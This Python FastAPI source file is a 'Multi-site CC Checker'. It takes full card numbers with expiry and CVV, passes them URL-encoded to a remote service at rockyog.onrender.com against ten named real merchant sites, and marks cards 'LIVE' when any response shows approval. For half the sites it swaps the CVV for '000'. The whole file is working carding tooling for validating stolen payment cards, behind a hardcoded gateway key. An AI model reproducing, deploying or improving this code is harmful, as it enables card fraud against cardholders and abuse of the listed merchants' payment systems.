from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse
import aiohttp
import asyncio
import time
import json
import urllib.parse
from typing import List, Dict, Any, Optional

app = FastAPI(title="Multi-site CC Checker")

# ------------ Configuration ------------
ALLOWED_GATEWAY = "killer"
ALLOWED_KEY = "rockybest"

# Up to 10 full site URLs
SITES: List[str] = [
    "https://deltacloudz.com",
    "https://therapyessentials.coraphysicaltherapy.com",
    "https://bacteriostaticwater.com",
    "https://livelovespa.com",
    "https://divinebovinejerky.com",
    "https://casabelladecor.net",
    "https://lptmedical.com",
    "https://restart.brooksrunning.com",
    "https://safeandsoundhq.com",
    "https://urbanspaceinteriors.com"
]

REMOTE_API_TEMPLATE = "https://rockyog.onrender.com/index.php?site={site}&cc={cc}"

# Networking / concurrency
PER_REQUEST_TIMEOUT = 15  # seconds
CONNECT_TIMEOUT = 60  # seconds
MAX_CONCURRENT = 3  # concurrency semaphore
# ---------------------------------------

def parse_cc(cc_raw: str):
    parts = cc_raw.split("|")
    if len(parts) < 4:
        raise ValueError("Invalid cc format. Expecting PAN|MM|YY|CVV")
    pan, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    return pan, mm, yy, cvv

async def fetch_site(session: aiohttp.ClientSession, url: str, site: str, cc_for_site: str, sem: asyncio.Semaphore) -> Dict[str, Any]:
    start = time.perf_counter()
    async with sem:
        try:
            timeout = aiohttp.ClientTimeout(total=PER_REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
            async with session.get(url, timeout=timeout) as resp:
                raw = await resp.text()
                status = resp.status
                duration_ms = round((time.perf_counter() - start) * 1000, 2)
                parsed = None
                try:
                    parsed = json.loads(raw)
                except Exception:
                    parsed = None
                return {
                    "site": site,
                    "url": url,
                    "cc": cc_for_site,
                    "http_status": status,
                    "duration_ms": duration_ms,
                    "raw_response": raw,
                    "parsed_response": parsed,
                    "error": None
                }
        except Exception as e:
            duration_ms = round((time.perf_counter() - start) * 1000, 2)
            return {
                "site": site,
                "url": url,
                "cc": cc_for_site,
                "http_status": None,
                "duration_ms": duration_ms,
                "raw_response": None,
                "parsed_response": None,
                "error": str(e)
            }

def decide_overall(results: List[Dict[str, Any]]) -> Dict[str, Any]:
    any_live = False
    any_error = False
    prices: List[float] = []
    for r in results:
        pr = r.get("parsed_response")
        if pr and isinstance(pr, dict):
            resp_text = str(pr.get("Response", "")).upper()
            status_field = pr.get("Status")
            if status_field in ("true", "1", True, "True", "TRUE", "ok", "OK"):
                any_live = True
            if any(k in resp_text for k in ["LIVE", "APPROVED", "SUCCESS"]):
                any_live = True
            if "ERROR" in resp_text or pr.get("Response") == "GENERIC_ERROR":
                any_error = True
            try:
                if "Price" in pr and pr["Price"] is not None:
                    prices.append(float(pr["Price"]))
            except Exception:
                pass
        else:
            if r.get("error") or (r.get("http_status") and r.get("http_status") >= 400):
                any_error = True

    if any_live:
        overall_response = "LIVE"
        status = "true"
    elif any_error:
        overall_response = "GENERIC_ERROR"
        status = "false"
    else:
        overall_response = "UNKNOWN"
        status = "unknown"

    avg_price: Optional[float] = None
    if prices:
        avg_price = round(sum(prices) / len(prices), 2)

    return {
        "Response": overall_response,
        "Status": status,
        "Price": avg_price
    }

@app.get("/gateway")
async def gateway(request: Request):
    params = request.query_params
    gateway = params.get("gateway")
    key = params.get("key")
    cc_raw = params.get("cc")

    if not gateway or not key or not cc_raw:
        raise HTTPException(status_code=400, detail="Missing required parameters: gateway, key, cc")

    if gateway != ALLOWED_GATEWAY or key != ALLOWED_KEY:
        raise HTTPException(status_code=403, detail="Unauthorized gateway/key")

    try:
        pan, mm, yy, cvv = parse_cc(cc_raw)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

    site_tasks = []
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    start_all = time.perf_counter()

    connector = aiohttp.TCPConnector(limit_per_host=MAX_CONCURRENT)
    headers = {"User-Agent": "MultiSiteCCChecker/1.0", "Accept": "application/json"}

    async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
        for i, site in enumerate(SITES[:10]):
            cc_for_site = "|".join([pan, mm, yy, "000"]) if i >= 5 else cc_raw
            url = REMOTE_API_TEMPLATE.replace("{site}", urllib.parse.quote_plus(site)).replace("{cc}", urllib.parse.quote_plus(cc_for_site))
            site_tasks.append(fetch_site(session=session, url=url, site=site, cc_for_site=cc_for_site, sem=sem))

        results = await asyncio.gather(*site_tasks)

    total_time_ms = round((time.perf_counter() - start_all) * 1000, 2)
    overall = decide_overall(results)

    final = {
        "Gateway": "Authorize.net",
        "Price": overall.get("Price"),
        "Response": overall.get("Response"),
        "Status": overall.get("Status"),
        "cc": cc_raw,
        "total_time_ms": total_time_ms,
        "per_site": results
    }

    return JSONResponse(content=final)

if __name__ == "__main__":
    import uvicorn
    uvicorn.run("app:app", host="0.0.0.0", port=8000, reload=False)
